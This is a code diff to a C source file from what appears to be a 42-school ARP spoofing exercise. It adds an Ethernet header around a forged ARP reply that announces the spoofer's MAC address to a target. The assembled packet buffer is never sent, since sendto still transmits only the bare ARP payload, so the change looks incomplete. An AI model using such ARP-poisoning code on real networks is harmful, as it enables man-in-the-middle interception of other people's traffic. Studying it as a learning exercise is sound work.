@@ -6,7 +6,7 @@
 /*   By: nponchon <nponchon@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/04 18:38:53 by nponchon          #+#    #+#             */
-/*   Updated: 2025/11/18 12:41:02 by nponchon         ###   ########.fr       */
+/*   Updated: 2025/11/18 17:15:56 by nponchon         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -66,14 +66,23 @@ void	send_arp(t_malcolm *m, unsigned char *buf)
 	printf("Sending forged ARP reply to %s\n", target_ip);
 
 	struct ether_arp forged_arp = forge_arp(arp, m);
+
+	struct ether_header eth_hdr;
+    memcpy(eth_hdr.ether_dhost, m->target_mac, ETH_ALEN); // Target MAC
+    memcpy(eth_hdr.ether_shost, m->source_mac, ETH_ALEN); // Spoofer's MAC
+    eth_hdr.ether_type = htons(ETHERTYPE_ARP); // ARP EtherType
+
+    // Combine Ethernet header and ARP payload
+    unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+    memcpy(packet, &eth_hdr, sizeof(struct ether_header)); // Copy Ethernet header
+    memcpy(packet + sizeof(struct ether_header), &forged_arp, sizeof(struct ether_arp)); // Copy ARP payload
+
 	ssize_t bytes_sent = sendto(m->socket, &forged_arp, sizeof(forged_arp), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
 	if (bytes_sent < 0) {
 		perror("sendto failed");
 	} else {
 		printf("Successfully sent forged ARP reply (%zd bytes)\n", bytes_sent);
 	}
-
-	return ;
 }
 
 int	listen_arp(t_malcolm *m)
